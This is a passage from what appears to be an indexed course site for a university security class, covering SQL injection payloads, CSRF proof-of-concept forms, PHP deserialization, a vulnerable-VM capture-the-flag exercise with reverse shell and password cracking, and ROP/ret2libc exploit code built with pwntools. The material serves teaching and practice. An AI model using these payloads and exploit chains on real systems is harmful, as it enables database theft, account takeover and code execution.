,\"MSSQL\"],\n[\"ROWNUM=ROWNUM\"                                   ,\"ORACLE\"],\n[\"RAWTOHEX('AB')=RAWTOHEX('AB')\"                   ,\"ORACLE\"],\n[\"LNNVL(0=123)\"                                    ,\"ORACLE\"],\n[\"5::int=5\"                                        ,\"POSTGRESQL\"],\n[\"5::integer=5\"                                    ,\"POSTGRESQL\"],\n[\"pg_client_encoding()=pg_client_encoding()\"       ,\"POSTGRESQL\"],\n[\"get_current_ts_config()=get_current_ts_config()\" ,\"POSTGRESQL\"],\n[\"quote_literal(42.5)=quote_literal(42.5)\"         ,\"POSTGRESQL\"],\n[\"current_database()=current_database()\"           ,\"POSTGRESQL\"],\n[\"sqlite_version()=sqlite_version()\"               ,\"SQLITE\"],\n[\"last_insert_rowid()&gt;1\"                           ,\"SQLITE\"],\n[\"last_insert_rowid()=last_insert_rowid()\"         ,\"SQLITE\"],\n[\"val(cvar(1))=1\"                                  ,\"MSACCESS\"],\n[\"IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0\"               ,\"MSACCESS\"],\n[\"cdbl(1)=cdbl(1)\"                                 ,\"MSACCESS\"],\n[\"1337=1337\",   \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"],\n[\"'i'='i'\",     \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"],\n</code></pre> <p>Also, if you have access to the output of the query, you could make it print the version of the database.</p> <p>A continuation we are going to discuss different methods to exploit different kinds of SQL Injection. We will use MySQL as example.</p>"},{"location":"CS315/2021/Week%2012/#exploiting-union-based","title":"Exploiting Union Based","text":""},{"location":"CS315/2021/Week%2012/#detecting-number-of-columns","title":"Detecting number of columns","text":"<p>If you can see the output of the query this is the best way to exploit it. First of all, wee need to find out the number of columns the initial request is returning. This is because both queries must return the same number of columns. Two methods are typically used for this purpose:</p>"},{"location":"CS315/2021/Week%2012/#ordergroup-by","title":"Order/Group by","text":"<p>Keep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.</p> <pre><code>1' ORDER BY 1--+    #True\n1' ORDER BY 2--+    #True\n1' ORDER BY 3--+    #True\n1' ORDER BY 4--+    #False - Query is only using 3 columns\n                        #-1' UNION SELECT 1,2,3--+    True\n1' GROUP BY 1--+    #True\n1' GROUP BY 2--+    #True\n1' GROUP BY 3--+    #True\n1' GROUP BY 4--+    #False - Query is only using 3 columns\n                        #-1' UNION SELECT 1,2,3--+    True\n</code></pre>"},{"location":"CS315/2021/Week%2012/#union-select","title":"UNION SELECT","text":"<p>Select more and more null values until the query is correct:</p> <pre><code>1' UNION SELECT null-- - Not working\n1' UNION SELECT null,null-- - Not working\n1' UNION SELECT null,null,null-- - Worked\n</code></pre> <p>You should use <code>null</code>values as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case.</p>"},{"location":"CS315/2021/Week%2012/#extract-database-names-table-names-and-column-names","title":"Extract database names, table names and column names","text":"<p>On the next examples we are going to retrieve the name of all the databases, the table name of a database, the column names of the table:</p> <pre><code>#Database names\n-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata\n\n#Tables of a database\n-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]\n\n#Column names\n-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]\n</code></pre> <p>There is a different way to discover this data on every different database, but it's always the same methodology.</p>"},{"location":"CS315/2021/Week%2012/#forms-websockets-and-postmsgs","title":"Forms, WebSockets and PostMsgs","text":"<p>When websocket, post message or a form allows user to perform actions vulnerabilities may arise.</p> <ul> <li>Cross Site Request Forgery</li> <li>Cross-site WebSocket hijacking (CSWSH)</li> <li>PostMessage Vulnerabilities</li> </ul>"},{"location":"CS315/2021/Week%2012/#csrf-cross-site-request-forgery","title":"CSRF (Cross Site Request Forgery)","text":""},{"location":"CS315/2021/Week%2012/#what-is-csrf","title":"What is CSRF?","text":"<p>Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. This is done by making a logged in user in the victim platform access an attacker controlled website and from there execute *malicious JS code, send forms or retrieve \"images\" to the* victims account.</p>"},{"location":"CS315/2021/Week%2012/#requisites","title":"Requisites","text":"<p>In order to be able to abuse a CSRF vulnerability you first need to find a relevant action to abuse (change password or email, make the victim follow you on a social network, give you more privileges...). The session must rely only on cookies or HTTP Basic Authentication header, any other header can't be used to handle the session. An finally, there shouldn't be unpredictable parameters on the request.</p> <p>Several counter-measures could be in place to avoid this vulnerability.</p>"},{"location":"CS315/2021/Week%2012/#common-defenses","title":"Common defenses","text":"<ul> <li>SameSite cookies: If the session cookie is using this flag, you may not be able to send the cookie from arbitrary web sites.</li> <li>Cross-origin resource sharing: Depending on which kind of HTTP request you need to perform to abuse the relevant action, you may take int account the CORS policy of the victim site. Note that the CORS policy won't affect if you just want to send a GET request or a POST request from a form and you don't need to read the response.</li> <li>Ask for the password user to authorise the action.</li> <li>Resolve a captcha</li> <li>Read the Referrer or Origin headers. If a regex is used it could be bypassed form example with:</li> <li>http://mal.net?orig=http://example.com (ends with the url)</li> <li>http://example.com.mal.net (starts with the url)</li> <li>Modify the name of the parameters of the Post or Get request</li> <li>Use a CSRF token in each session. This token has to be send inside the request to confirm the action. This token could be protected with CORS.</li> </ul>"},{"location":"CS315/2021/Week%2012/#csrf-map","title":"CSRF map","text":""},{"location":"CS315/2021/Week%2012/#exploit-examples","title":"Exploit Examples","text":""},{"location":"CS315/2021/Week%2012/#exfiltrating-csrf-token","title":"Exfiltrating CSRF Token","text":"<p>If a CSRF token is being used as defence you could try to exfiltrate it abusing a XSS vulnerability or a Dangling Markup vulnerability.</p>"},{"location":"CS315/2021/Week%2012/#get-using-html-tags","title":"GET using HTML tags","text":"<pre><code>&lt;img src=\"http://google.es?param=VALUE\" style=\"display:none\" /&gt;\n&lt;h1&gt;404 - Page not found&lt;/h1&gt;\nThe URL you are requesting is no longer available\n</code></pre> <p>Other HTML5 tags that can be used to automatically send a GET request are:</p> <p></p>"},{"location":"CS315/2021/Week%2012/#form-get-request","title":"Form GET request","text":"<pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form method=\"GET\" action=\"https://victim.net/email/change-email\"&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"some@email.com\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"CS315/2021/Week%2012/#form-post-request","title":"Form POST request","text":"<pre><code>&lt;html&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form action=\"https://victim.net/email/change-email\" id=\"csrfform\"&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"some@email.com\" autofocus onfocus=\"csrfform.submit();\" /&gt; &lt;!-- Way 1 to autosubmit --&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n      &lt;img src=x onerror=\"csrfform.submit();\" /&gt; &lt;!-- Way 2 to autosubmit --&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.forms[0].submit(); //Way 3 to autosubmit\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"CS315/2021/Week%2012/#form-post-request-through-iframe","title":"Form POST request through iframe","text":"<pre><code>&lt;!-- \nThe request is sent through the iframe withuot reloading the page \n--&gt;\n&lt;html&gt;\n  &lt;body&gt;\n  &lt;iframe style=\"display:none\" name=\"csrfframe\"&gt;&lt;/iframe&gt; \n    &lt;form action=\"/change-email\" id=\"csrfform\" target=\"csrfframe\"&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"some@email.com\" autofocus onfocus=\"csrfform.submit();\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"CS315/2021/Week%2012/#tools","title":"Tools","text":"<ul> <li>https://github.com/0xInfection/XSRFProbe</li> </ul>"},{"location":"CS315/2021/Week%2012/#http-headers","title":"HTTP Headers","text":"<p>Depending on the HTTP headers given by the web server some vulnerabilities might be present.</p> <ul> <li>Clickjacking</li> <li>Content Security Policy bypass</li> <li>Cookies Hacking</li> <li>CORS - Misconfigurations &amp; Bypass</li> </ul>"},{"location":"CS315/2021/Week%2012/#bypasses","title":"Bypasses","text":"<p>There are several specific functionalities were some workarounds might be useful to bypass them</p> <ul> <li>2FA/OPT Bypass</li> <li>Bypass Payment Process</li> <li>Captcha Bypass</li> <li>Login Bypass</li> <li>Race Condition</li> <li>Rate Limit Bypass</li> <li>Reset Forgotten Password Bypass</li> <li>Registration Vulnerabilities</li> </ul>"},{"location":"CS315/2021/Week%2012/#structured-objects-specific-functionalities","title":"Structured objects / Specific functionalities","text":"<p>Some functionalities will require the data to be structured on a very specific format (like a language serialized object or a XML). Therefore, it's more easy to identify is the application might be vulnerable as it needs to be processing that kind of data. Some specific functionalities my be also vulnerable if a specific format of the input is used (like Email Header Injections).</p> <ul> <li>Deserialization</li> <li>Email Header Injection</li> <li>JWT Vulnerabilities</li> <li>XML External Entity</li> </ul>"},{"location":"CS315/2021/Week%2012/#deserialization","title":"Deserialization","text":"<p>Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications.</p> <p>Deserialization is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.</p> <p>In many occasions you can find some code in the server side that unserialize some object given by the user. In this case, you can send a malicious payload to make the server side behave unexpectedly.</p> <p>You should read: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html for learn how to attack.</p>"},{"location":"CS315/2021/Week%2012/#php","title":"PHP","text":"<p>Magic method used with serialization:</p> <ul> <li><code>__sleep</code> is called when an object is serialized and must be returned to array</li> </ul> <p>Magic method used with deserialization</p> <ul> <li><code>__wakeup</code> is called when an object is deserialized.</li> <li><code>__destruct</code> is called when PHP script end and object is destroyed.</li> <li><code>__toString</code> uses object as string but also can be used to read file or more than that based on function call inside it.</li> </ul> <pre><code>&lt;?php\nclass test {\n    public $s = \"This is a test\";\n    public function displaystring(){\n        echo $this-&gt;s.'&lt;br /&gt;';\n    }\n    public function __toString()\n    {\n        echo '__toString method called';\n    }\n    public function __construct(){\n        echo \"__construct method called\";\n    }\n    public function __destruct(){\n        echo \"__destruct method called\";\n    }\n    public function __wakeup(){\n        echo \"__wakeup method called\";\n    }\n    public function __sleep(){\n        echo \"__sleep method called\";\n        return array(\"s\"); #The \"s\" makes references to the public attribute\n    }\n}\n\n$o = new test();\n$o-&gt;displaystring();\n$ser=serialize($o);\necho $ser;\n$unser=unserialize($ser);\n$unser-&gt;displaystring();\n\n/*\nphp &gt; $o = new test();\n__construct method called__destruct method called\nphp &gt; $o-&gt;displaystring();\nThis is a test&lt;br /&gt;\nphp &gt; $ser=serialize($o);\n__sleep method called\nphp &gt; echo $ser;\nO:4:\"test\":1:{s:1:\"s\";s:14:\"This is a test\";}\nphp &gt; $unser=unserialize($ser);\n__wakeup method called__destruct method called\nphp &gt; $unser-&gt;displaystring();\nThis is a test&lt;br /&gt;\n*/\n?&gt;\n</code></pre> <p>If you look to the results you can see that the functions <code>__wakeup</code> and <code>__destruct</code> are called when the object is deserialized. Note that in several tutorials you will find that the <code>__toString</code> function is called when trying yo print some attribute, but apparently that's not happening anymore.</p> <p>Autoload Classes may also be dangerous.</p> <p>You can read an explained PHP example here: https://www.notsosecure.com/remote-code-execution-via-php-unserialize/, here https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf or here https://securitycafe.ro/2015/01/05/understanding-php-object-injection/</p>"},{"location":"CS315/2021/Week%2012/#serializing-referenced-values","title":"Serializing Referenced Values","text":"<p>If for some reason you want to serialize a value as a reference to another value serialized you can:</p> <pre><code>&lt;?php\nclass AClass {\n    public $param1;\n    public $param2;\n}\n\n$o = new WeirdGreeting;\n$o-&gt;param1 =&amp; $o-&gt;param22;\n$o-&gt;param = \"PARAM\";\n$ser=serialize($o);\n</code></pre>"},{"location":"CS315/2021/Week%2012/#files","title":"Files","text":"<p>Functionalities that allow to upload files might be vulnerable to several issues. Functionalities that generates files including user input might execute unexpected code. Users that open files uploaded by users or automatically generated including user input might be compromised.</p> <ul> <li>File Upload</li> <li>Formula Injection</li> <li>PDF Injection</li> <li>Server Side XSS</li> </ul>"},{"location":"CS315/2021/Week%2012/#external-identity-management","title":"External Identity Management","text":"<ul> <li>OAUTH to Account takeover</li> <li>SAML Attacks</li> </ul>"},{"location":"CS315/2021/Week%2012/#other-helpful-vulnerabilities","title":"Other Helpful Vulnerabilities","text":"<p>This vulnerabilities might help to exploit other vulnerabilities.</p> <ul> <li>Domain/Subdomain takeover</li> <li>IDOR</li> <li>Parameter Pollution</li> <li>Unicode Normalization vulnerability</li> </ul>"},{"location":"CS315/2021/Week%2012/#exercise","title":"Exercise","text":""},{"location":"CS315/2021/Week%2012/#10-pt-blogger-website","title":"(10 pt) Blogger Website","text":"<p>In this challenge, you need to download the following virtual machine to finish the challenges.</p> <p>The box was created with <code>Virtualbox</code>. Upon booting up use <code>netdiscover</code> tool to find the IP address. This is the target address based on whatever settings you have. You should verify the address just in case.</p> <p>You don't need to answer all questions in order. Skip some questions may not affect the next steps.</p> <p>Download: https://mega.nz/file/HxFXgIAT#PFjk8HV_ltXVh-Hz1D3xAXYc31GpmgTQeFfkKibn9Tc</p> <p>Mirror: https://pan.baidu.com/s/1mOZxE_XHgbSZR_yKTWQAbA (Code: 1337)</p>"},{"location":"CS315/2021/Week%2012/#2-pt-establish","title":"(2 pt) Establish","text":"<p>Environment setup should use <code>VirtualBox</code> history version (VirtualBox 6.1.28 has a bug with Hyper-V, I used VirtualBox 6.0.24 and worked properly). You should setup Network as the following:</p> <p></p> <p>While the Serial Ports setting as follow (Port Mode set to <code>Disconnected</code>):</p> <p></p> <p>The virtual image should enter the following promption:</p> <pre><code>Ubuntu 16.04.7 LTS ubuntu-xenial tty1\nubuntu-xenial login: _\n</code></pre> <p>Finding the IP address:</p> <p>Open you terminal (powershell.exe in Windows), and use <code>ipconfig /all</code> to find your <code>Host-only NET</code> ip address.</p> <p></p> <p>Use any tool to scan the ip <code>192.168.xx.0/24</code> and you can find the virtual machine ip address. Otherwise, you can also use <code>arp -a</code> to find your <code>Host-only Network</code> address, and usually VM's ip address is followed.</p> <p></p> <p>Open your web browser, you can find this page in VM's ip address:</p> <p></p> <p>You are done with configuration, now you can hack the machine and solve the challenges!</p> <p>Upload a screenshot about the web page and the IP address would give 2 points.</p>"},{"location":"CS315/2021/Week%2012/#2-pt-port-scan-and-directory-scan","title":"(2 pt) Port scan and directory scan","text":"<p>Using Nmap you can scan open ports of VM. Only port 80 is open and we can find a HTTP website. Using Gobuster or Dirb to scan the website directory, you may find a upload folder under the blogger.</p> <p>What's the URL of the upload folder?</p> <p>Answer: <code>http://ip/******/*****/****/**********/*******/</code> (replace all stars to your answer)</p> <p>Hint: kali wordlists for scanning: /usr/share/wordlists. If you don't have those files, it's fine to search a wordlist online.</p>"},{"location":"CS315/2021/Week%2012/#2-pt-wordpress","title":"(2 pt) Wordpress","text":"<p>It's easy to find the blogger is using Wordpress. The version of the given blogger is vulnerable. What's the vulnerability name of the blogger?</p> <p>Answer: <code>A******** F*** U*****</code> (replace all stars to your answer, needn't to be 100% the same)</p> <p>Hint: look at the version of wordpress. Search in the exploitDB.</p>"},{"location":"CS315/2021/Week%2012/#2-pt-reverse-shell","title":"(2 pt) Reverse shell","text":"<p>Using the vulnerability, you can get a reversed shell. Besides, with some techniques, you can generate a pty shell. What's the name of users?</p> <p>Answer: <code>u*****, j****, v******</code> (replace all stars to your answer)</p> <p>Hint: users can be located in /etc/passwd or /home folder.</p>"},{"location":"CS315/2021/Week%2012/#2-pt-root","title":"(2 pt) Root","text":"<p>Weak password is dangerous, using Hydra or other password cracker can easily break the weak password. Get the root privilege and find me <code>root.txt</code>.</p> <p>Answer: <code>flag{****_****_***_**********_** **}</code></p> <p>Hint: sometimes sudo can be vulnerable.</p>"},{"location":"CS315/2021/Week%2013/","title":"Week13 PWN: ROL and ROP","text":"<p>According to the @CTF101: https://ctf101.org/</p>"},{"location":"CS315/2021/Week%2013/#return-oriented-programming","title":"Return Oriented Programming","text":"<p>Return Oriented Programming (or ROP) is the idea of chaining together small snippets of assembly with stack control to cause the program to do more complex things.</p> <p>As we saw in buffer overflows, having stack control can be very powerful since it allows us to overwrite saved instruction pointers, giving us control over what the program does next. Most programs don't have a convenient <code>give_shell</code> function however, so we need to find a way to manually invoke <code>system</code> or another <code>exec</code> function to get us our shell.</p>"},{"location":"CS315/2021/Week%2013/#32-bit","title":"32 bit","text":"<p>Imagine we have a program similar to the following:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nchar name[32];\n\nint main() {\n    printf(\"What's your name? \");\n    read(0, name, 32);\n\n    printf(\"Hi %s\\n\", name);\n\n    printf(\"The time is currently \");\n    system(\"/bin/date\");\n\n    char echo[100];\n    printf(\"What do you want me to echo back? \");\n    read(0, echo, 1000);\n    puts(echo);\n\n    return 0;\n}\n</code></pre> <p>We obviously have a stack buffer overflow on the <code>echo</code> variable which can give us EIP control when <code>main</code> returns. But we don't have a <code>give_shell</code> function! So what can we do?</p> <p>We can call <code>system</code> with an argument we control! Since arguments are passed in on the stack in 32-bit Linux programs (see calling conventions), if we have stack control, we have argument control.</p> <p>When main returns, we want our stack to look like something had normally called <code>system</code>. Recall what is on the stack after a function has been called:</p> <pre><code>        ...                                 // More arguments\n        0xffff0008: 0x00000002              // Argument 2\n        0xffff0004: 0x00000001              // Argument 1\nESP -&gt;  0xffff0000: 0x080484d0              // Return address\n</code></pre> <p>So <code>main</code>'s stack frame needs to look like this:</p> <pre><code>        0xffff0008: 0xdeadbeef              // system argument 1\n        0xffff0004: 0xdeadbeef              // return address for system\nESP -&gt;  0xffff0000: 0x08048450              // return address for main (system's PLT entry)\n</code></pre> <p>Then when <code>main</code> returns, it will jump into <code>system</code>'s PLT entry and the stack will appear just like <code>system</code> had been called normally for the first time.</p> <p>Note: we don't care about the return address <code>system</code> will return to because we will have already gotten our shell by then!</p>"},{"location":"CS315/2021/Week%2013/#arguments","title":"Arguments","text":"<p>This is a good start, but we need to pass an argument to <code>system</code> for anything to happen. As mentioned in the page on ASLR, the stack and dynamic libraries \"move around\" each time a program is run, which means we can't easily use data on the stack or a string in libc for our argument. In this case however, we have a very convenient <code>name</code> global which will be at a known location in the binary (in the BSS segment).</p>"},{"location":"CS315/2021/Week%2013/#putting-it-together","title":"Putting it together","text":"<p>Our exploit will need to do the following:</p> <ol> <li>Enter \"sh\" or another command to run as <code>name</code></li> <li>Fill the stack with</li> <li>Garbage up to the saved EIP</li> <li>The address of <code>system</code>'s PLT entry</li> <li>A fake return address for system to jump to when it's done</li> <li>The address of the <code>name</code> global to act as the first argument to <code>system</code></li> </ol>"},{"location":"CS315/2021/Week%2013/#64-bit","title":"64 bit","text":"<p>In 64-bit binaries we have to work a bit harder to pass arguments to functions. The basic idea of overwriting the saved RIP is the same, but as discussed in calling conventions, arguments are passed in registers in 64-bit programs. In the case of running <code>system</code>, this means we will need to find a way to control the RDI register.</p> <p>To do this, we'll use small snippets of assembly in the binary, called \"gadgets.\" These gadgets usually <code>pop</code> one or more registers off of the stack, and then call <code>ret</code>, which allows us to chain them together by making a large fake call stack.</p> <p>For example, if we needed control of both RDI and RSI, we might find two gadgets in our program that look like this (using a tool like rp++ or ROPgadget):</p> <pre><code>0x400c01: pop rdi; ret\n0x400c03: pop rsi; pop r15; ret\n</code></pre> <p>We can setup a fake call stack with these gadets to sequentially execute them, <code>pop</code>ing values we control into registers, and then end with a jump to <code>system</code>.</p>"},{"location":"CS315/2021/Week%2013/#example","title":"Example","text":"<pre><code>        0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled\n        0xffff0020: 0x1337beef          // value we want in r15 (probably garbage)\n        0xffff0018: 0x1337beef          // value we want in rsi\n        0xffff0010: 0x400c03            // address that the rdi gadget's ret will return to - the pop rsi gadget\n        0xffff0008: 0xdeadbeef          // value to be popped into rdi\nRSP -&gt;  0xffff0000: 0x400c01            // address of rdi gadget\n</code></pre> <p>Stepping through this one instruction at a time, <code>main</code> returns, jumping to our <code>pop rdi</code> gadget:</p> <pre><code>RIP = 0x400c01 (pop rdi)\nRDI = UNKNOWN\nRSI = UNKNOWN\n\n        0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled\n        0xffff0020: 0x1337beef          // value we want in r15 (probably garbage)\n        0xffff0018: 0x1337beef          // value we want in rsi\n        0xffff0010: 0x400c03            // address that the rdi gadget's ret will return to - the pop rsi gadget\nRSP -&gt;  0xffff0008: 0xdeadbeef          // value to be popped into rdi\n</code></pre> <p><code>pop rdi</code> is then executed, popping the top of the stack into RDI:</p> <pre><code>RIP = 0x400c02 (ret)\nRDI = 0xdeadbeef\nRSI = UNKNOWN\n\n        0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled\n        0xffff0020: 0x1337beef          // value we want in r15 (probably garbage)\n        0xffff0018: 0x1337beef          // value we want in rsi\nRSP -&gt;  0xffff0010: 0x400c03            // address that the rdi gadget's ret will return to - the pop rsi gadget\n</code></pre> <p>The RDI gadget then <code>ret</code>s into our RSI gadget:</p> <pre><code>RIP = 0x400c03 (pop rsi)\nRDI = 0xdeadbeef\nRSI = UNKNOWN\n\n        0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled\n        0xffff0020: 0x1337beef          // value we want in r15 (probably garbage)\nRSP -&gt;  0xffff0018: 0x1337beef          // value we want in rsi\n</code></pre> <p>RSI and R15 are popped:</p> <pre><code>RIP = 0x400c05 (ret)\nRDI = 0xdeadbeef\nRSI = 0x1337beef\n\nRSP -&gt;  0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled\n</code></pre> <p>And finally, the RSI gadget <code>ret</code>s, jumping to whatever function we want, but now with RDI and RSI set to values we control.</p>"},{"location":"CS315/2021/Week%2013/#rop-syscall-execv","title":"ROP - Syscall execv","text":"<p>The objective is to call the syscall (execv) from a ROP controlling the value of registries: RDI, RSI, RDX, RAX and obviously the RIP (the other ones doesn't matters), and controlling somewhere to write \"/bin/sh\"</p> <ul> <li>RDI: Pointing to the string \"/bin/bash\"</li> <li>RSI: Null</li> <li>RDX: Null</li> <li>RAX: Value 0x3b for x64 and 0xb for x32, because this will call execv</li> </ul> <pre><code>ROPgadget --binary vulnbinary | grep syscall\nROPgadget --binary vulnbinary | grep \"rdi\\|rsi\\|rdx\\|rax\" | grep pop\n</code></pre>"},{"location":"CS315/2021/Week%2013/#writing","title":"Writing","text":"<p>If you can somehow write to an address and then get the address of where you have written then this step is unnecessary.</p> <p>Elsewhere, you may search for some write-what-where. As is explained in this tutorial: https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/ you have to find something that allows you to save some value inside a registry and then save it to some controlled address inside another registry. For example some <code>pop eax; ret</code> , <code>pop edx: ret</code> , <code>mov eax, [edx]</code></p> <p>You can find mov gadgets doing: <code>ROPgadget --binary vulnbinary | grep mov</code></p>"},{"location":"CS315/2021/Week%2013/#finding-a-place-to-write","title":"Finding a place to write","text":"<p>If you have found some write-what-where and can control the needed registries to call execv, there is only left finding a place to write.</p> <pre><code>objdump -x vulnbinary | grep \".bss\" -B1\n                  CONTENTS, ALLOC, LOAD, DATA\n 23 .bss          00000010  00403418  00403418  00002418  23\n</code></pre> <p>In this case: 0x403418</p>"},{"location":"CS315/2021/Week%2013/#writing-binsh","title":"Writing \"/bin/sh\"","text":"<pre><code>buffer += address(pop_eax) # place value into EAX\nbuffer += \"/bin\"           # 4 bytes at a time\nbuffer += address(pop_edx)         # place value into edx\nbuffer += address(writable_memory)\nbuffer += address(writewhatwhere)\n\nbuffer += address(pop_eax)\nbuffer += \"//sh\"\nbuffer += address(pop_edx)\nbuffer += address(writable_memory + 4)\nbuffer += address(writewhatwhere)\n</code></pre>"},{"location":"CS315/2021/Week%2013/#rop-leaking-libc-address","title":"ROP - Leaking LIBC address","text":""},{"location":"CS315/2021/Week%2013/#quick-resume","title":"Quick Resume","text":"<ol> <li>Find overflow offset</li> <li>Find POP_RDI, PUTS_PLT and MAIN_PLT gadgets</li> <li>Find memory address of puts and guess the libc version (donwload it)</li> <li>Given the library just exploit it</li> </ol>"},{"location":"CS315/2021/Week%2013/#other-tutorials-and-binaries-to-practice","title":"Other tutorials and binaries to practice","text":"<p>This tutorial is going to exploit the code/binary proposed in this tutorial: https://tasteofsecurity.com/security/ret2libc-unknown-libc/ Another useful tutorial: https://made0x78.com/bseries-ret2libc/</p>"},{"location":"CS315/2021/Week%2013/#code","title":"Code","text":"<p>Filename: <code>vuln.c</code></p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char buffer[32];\n    puts(\"Simple ROP.\\n\");\n    gets(buffer);\n\n    return 0;\n}\ngcc -o vuln vuln.c -fno-stack-protector  -no-pie\n</code></pre>"},{"location":"CS315/2021/Week%2013/#rop-pwntools-template","title":"ROP - PWNtools template","text":"<p>Find my ROP-PWNtools template here. I'm going to use the code located there to make the exploit. Download the exploit and place it in the same directory as the vulnerable binary.</p>"},{"location":"CS315/2021/Week%2013/#1-finding-the-offset","title":"1- Finding the offset","text":"<p>The template need an offset before continuing with the exploit. If any is provided it will execute the necessary code to find it (by default <code>OFFSET = \"\"</code>):</p> <pre><code>####################\n#### Find offset ###\n####################\nOFFSET = \"\"#\"A\"*72\nif OFFSET == \"\":\n    gdb.attach(p.pid, \"c\") #Attach and continue\n    payload = cyclic(1000)\n    print(r.clean())\n    r.sendline(payload)\n    #x/wx $rsp -- Search for bytes that crashed the application\n    #cyclic_find(0x6161616b) # Find the offset of those bytes\n    return\n</code></pre> <p>Execute <code>python template.py</code> a GDB console will be opened with the program being crashed. Inside that GDB console execute <code>x/wx $rsp</code> to get the bytes that were going to overwrite the RIP. Finally get the offset using a python console:</p> <pre><code>from pwn import *\ncyclic_find(0x6161616b)\n</code></pre> <p></p> <p>After finding the offset (in this case 40) change the OFFSET variable inside the template using that value. <code>OFFSET = \"A\" * 40</code></p>"},{"location":"CS315/2021/Week%2013/#2-finding-gadgets","title":"2- Finding Gadgets","text":"<p>Now we need to find ROP gadgets inside the binary. This ROP gadgets will be useful to call <code>puts</code>to find the libc being used, and later to launch the final exploit.</p> <pre><code>PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols[\"puts\"] # This is also valid to call puts\nMAIN_PLT = elf.symbols['main']\nPOP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep \"pop rdi\"\nRET = (rop.find_gadget(['ret']))[0]\n\nlog.info(\"Main start: \" + hex(MAIN_PLT))\nlog.info(\"Puts plt: \" + hex(PUTS_PLT))\nlog.info(\"pop rdi; ret  gadget: \" + hex(POP_RDI))\n</code></pre> <p>The <code>PUTS_PLT</code> is needed to call the function puts. The <code>MAIN_PLT</code> is needed to call the main function again after one interaction to exploit the overflow again (infinite rounds of exploitation).It is used at the end of each ROP. The POP_RDI is needed to pass a parameter to the called function.</p> <p>In this step you don't need to execute anything as everything will be found by pwntools during the execution.</p>"},{"location":"CS315/2021/Week%2013/#3-finding-libc-library","title":"3- Finding LIBC library","text":"<p>Now is time to find which version of the libc library is being used. To do so we are going to leak the address in memory of the function <code>puts</code>and then we are going to search in which library version the puts version is in that address.</p> <pre><code>def get_addr(func_name):\n    FUNC_GOT = elf.got[func_name]\n    log.info(func_name + \" GOT @ \" + hex(FUNC_GOT))\n    # Create rop chain\n    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)\n\n    #Send our rop-chain payload\n    #p.sendlineafter(\"dah?\", rop1) #Interesting to send in a specific moment\n    print(p.clean()) # clean socket buffer (read all and print)\n    p.sendline(rop1)\n\n    #Parse leaked address\n    recieved = p.recvline().strip()\n    leak = u64(recieved.ljust(8, \"\\x00\"))\n    log.info(\"Leaked libc address,  \"+func_name+\": \"+ hex(leak))\n    #If not libc yet, stop here\n    if libc != \"\":\n        libc.address = leak - libc.symbols[func_name] #Save libc base\n        log.info(\"libc base @ %s\" % hex(libc.address))\n\n    return hex(leak)\n\nget_addr(\"puts\") #Search for puts address in memmory to obtains libc base\nif libc == \"\":\n    print(\"Find the libc library and continue with the exploit... (https://libc.blukat.me/)\")\n    p.interactive()\n</code></pre> <p>To do so, the most important line of the executed code is:</p> <pre><code>rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)\n</code></pre> <p>This will send some bytes util overwriting the RIP is possible: <code>OFFSET</code>. Then, it will set the address of the gadget <code>POP_RDI</code> so the next address (<code>FUNC_GOT</code>) will be saved in the RDI registry. This is because we want to call puts passing it the address of the <code>PUTS_GOT</code>as the address in memory of puts function is saved in the address pointing by 